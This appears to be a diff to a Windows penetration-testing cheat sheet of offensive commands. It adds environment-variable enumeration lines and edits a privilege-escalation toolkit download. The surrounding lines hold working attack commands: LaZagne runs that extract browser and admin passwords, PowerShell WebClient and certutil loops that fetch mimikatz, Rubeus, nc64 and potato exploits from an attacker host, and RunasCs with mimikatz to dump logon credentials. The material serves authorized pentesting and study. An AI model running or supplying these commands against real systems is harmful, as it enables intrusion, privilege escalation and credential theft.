@@ -38,6 +38,8 @@ whoami:whoami && hostname && ipconfig # quick context; target-machine
 whoami:whoami /all # full token info including groups and privileges; target-machine
 whoami:whoami /priv # Show only privileges; target-machine
 whoami:whoami /groups # Show only group memberships; target-machine
+list environment variables:set; #cmd terminal; target-machine
+list environment variables:Get-ChildItem Env: #powershell; target-machine
 enum:echo [+]NET && netstat -ano && echo [+]IP && ipconfig && echo [+]HOST && hostname && echo [+]TASKS && schtasks /query /fo LIST /v && echo [+]DRIVES && fsutil fsinfo drives # one-shot SA: ports, IP, host, tasks, drives; target-machine
 System Info:systeminfo # Get OS version, hotfixes, and system architecture; target-machine
 System Info:systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" # Quick OS info; target-machine
@@ -357,7 +359,7 @@ LaZagne:.\laZagne.exe sysadmin # Extract system admin passwords; target-machine
 Browser Passwords:.\laZagne.exe browsers # Run LaZagne to extract browser passwords; target-machine
 Browser Passwords:python3 laZagne.py browsers # Python version; target-machine
 ^Privesc Toolkit:powershell.exe -c "$u='http://<kali>:<kaliPort>/';'PrivescCheck.ps1','JuicyPotato.exe','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe'|%{(New-Object Net.WebClient).DownloadFile($u+$_,$_)}" # Download complete privesc toolkit via WebClient; target-machine
-Privesc Toolkit:File Download:$u='http://<kali>:<kaliPort>/'; 'PrivescCheck.ps1','JuicyPotato.exe','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe' | ForEach-Object {(New-Object Net.WebClient).DownloadFile($u+$_,$_)} #download multiple tools from attacker web server using PowerShell WebClient loop; target-machine
+Privesc Toolkit:$u='http://<kali>:<kaliPort>/'; 'PrivescCheck.ps1','JuicyPotato.exe','SharpHound.ps1','GodPotato-NET4.exe','nc64.exe','PrintSpoofer64.exe','SharpGPOAbuse.exe','LaZagne.exe','PowerUp.ps1','SeManageVolumeExploit.exe','winPEASany_ofs.exe','PowerView.ps1','Rubeus.exe','mimikatz.exe' | ForEach-Object {(New-Object Net.WebClient).DownloadFile($u+$_,$_)} #download multiple tools from attacker web server using PowerShell WebClient loop; target-machine
 Privesc Toolkit:cmd.exe /c "for %f in (GodPotato-NET4.exe JuicyPotato.exe SharpHound.ps1 nc64.exe PrintSpoofer64.exe SharpGPOAbuse.exe LaZagne.exe PowerUp.ps1 PrivescCheck.ps1 SeManageVolumeExploit.exe winPEASany_ofs.exe PowerView.ps1 Rubeus.exe mimikatz.exe) do certutil.exe -f -urlcache -split http://<kali>:<kaliPort>/%f %f" # Download toolkit with certutil when PowerShell restricted; target-machine
 UAC Bypass:.\RunasCs.exe <user> <password> "whoami /priv" -domain <domain> -b #execute command as another domain user and enumerate privileges (check for SeDebugPrivilege) before attempting UAC bypass; target-machine
 UAC Bypass:.\RunasCs.exe <user> <password> "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit" -domain <domain> -b #execute command as another domain user using RunasCs with logon bypass to dump credentials via mimikatz; target-machine
